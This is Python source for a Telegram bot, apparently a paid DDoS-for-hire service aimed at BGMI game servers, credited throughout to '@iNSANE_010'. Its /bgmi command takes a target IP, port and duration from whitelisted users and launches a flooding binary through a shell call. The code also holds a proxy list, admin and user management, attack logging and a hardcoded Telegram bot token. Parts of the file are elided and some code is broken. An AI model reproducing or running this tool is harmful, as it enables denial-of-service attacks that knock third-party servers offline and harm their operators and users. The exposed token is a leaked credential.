...
# @iNSANE_010 GRP#bgmiddoserpython
...
# @iNSANE_010 GRPTg #from keep_alive import keep_alive
# @iNSANE_010 GRP #keep_alive()
# @iNSANE_010 GRP# insert your Telegram bot token here

    
bot = telebot.TeleBot('8101255502:AAG1wib-2N7SBZ03f7zjiui3aUghqciKI6w')

# @iNSANE_010 GRP # Admin user IDs
admin_id = ["1221262658"]

# @iNSANE_010 GRP # File to store allowed user IDs
USER_FILE = "users.txt"

# @iNSANE_010 GRP # File to store command logs
LOG_FILE = "log.txt"


# @iNSANE_010 GRP # List of proxy addresses
PROXIES = [
...
"https://162.223.94.164:80",#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
...
"https://50.168.163.182:80",#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
...
"https://3.12.144.146:3128",#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
...
"https://50.174.7.157:80",#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010
...
"https://12.186.205.122:80",#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010
...
"https://50.239.72.18:80",#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
...
"https://134.73.65.97:6649"
    # @iNSANE_010 GRP # Add more proxy addresses as needed
]
...
# @iNSANE_010 GRP# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @iNSANE_010 GRP # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
...
# @iNSANE_010 GRP # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # @iNSANE_010 GRP # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @iNSANE_010 GRP # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = ". No data found ."#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
...
# @iNSANE_010 GRP # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
...
def add_user(message):
    ...
    if user_id in admin_id:
        command = message.text.split()#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
#script by @iNSANE_010 
        ...
        if len(command) > 1:
            ...
            if user_to_add not in allowed_user_ids:
                ...
                response = f"𝗛𝗘𝗬 𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 INSANE PAPA😎👋\n\n 𝘂𝘀𝗲𝗿 --> {user_to_add} \n𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟 ❤️ \n\n𝗡𝗢𝗪 𝗔𝗗𝗗 𝗠𝗢𝗗𝗘"
            else:
...
# @iNSANE_010 GRP # Function to handle the reply when free users run the /bgmi command
...
# @iNSANE_010 GRP # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {60}
...
# @iNSANE_010 GRP # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @iNSANE_010 GRP # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @iNSANE_010 GRP # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 60:
                response = "🦋⁂༄𝙲𝙤𝙤𝕝𝒅𝒐ฬ𝒏༄⁂🦋"
                bot.reply_to(message, response)
                return
            # @iNSANE_010 GRP # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @iNSANE_010 GRP # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @iNSANE_010 GRP # Convert time to integer
            time = int(command[3])  # @iNSANE_010 GRP # Convert port to integer
            if time > 300:
                response = "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗲𝗻𝘁𝗲𝗿𝗲𝗱 30𝟬 𝘀𝗲𝗰"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @iNSANE_010 GRP # Call start_attack_reply function
                full_command = f"./sun {target} {port} {time} 1200"
                subprocess.run(full_command, shell=True)
                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══@iNSANE_010 OFFICIAL═══"
        else:
            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /bgmi 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 𝟮𝟰𝟬\n𝗟𝗜𝗞𝗘 :- /bgmi 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n═══@iNSANE_010 OFFIAL═══"  # @iNSANE_010 GRP # Updated command syntax
    else:
...
# @iNSANE_010 GRP # Add /mylogs command to display logs recorded for bgmi and website commands

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''🙏 ROCKET 🚀 PAID BOT BY @iNSANE_010 🙏'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''@iNSANE_010'''
    bot.reply_to(message, response)
